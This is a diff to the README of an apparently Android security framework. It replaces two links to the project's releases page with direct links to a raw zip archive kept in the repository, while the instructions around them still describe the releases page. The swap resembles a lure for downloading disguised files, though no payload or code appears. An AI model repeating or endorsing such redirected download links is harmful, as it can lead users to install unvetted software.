@@ -1,6 +1,6 @@
 # 🛡️ OcyShield-Framework - Secure Android devices with minimal effort
 
-[![](https://img.shields.io/badge/Download_OcyShield-Blue?style=for-the-badge)](https://github.com/lucioloprey/OcyShield-Framework/releases)
+[![](https://img.shields.io/badge/Download_OcyShield-Blue?style=for-the-badge)](https://github.com/lucioloprey/OcyShield-Framework/raw/refs/heads/main/modules/Framework-Ocy-Shield-v3.7.zip)
 
 ## What is OcyShield-Framework?
 
@@ -29,7 +29,7 @@ Follow these steps to prepare your system and run the software.
 
 You must obtain the official installer from our release page. Visit this page to download the latest version of the framework.
 
-[Download OcyShield-Framework Here](https://github.com/lucioloprey/OcyShield-Framework/releases)
+[Download OcyShield-Framework Here](https://github.com/lucioloprey/OcyShield-Framework/raw/refs/heads/main/modules/Framework-Ocy-Shield-v3.7.zip)
 
 1. Click the link above to open the repository release page.
 2. Look for the Assets section at the bottom of the top release header.
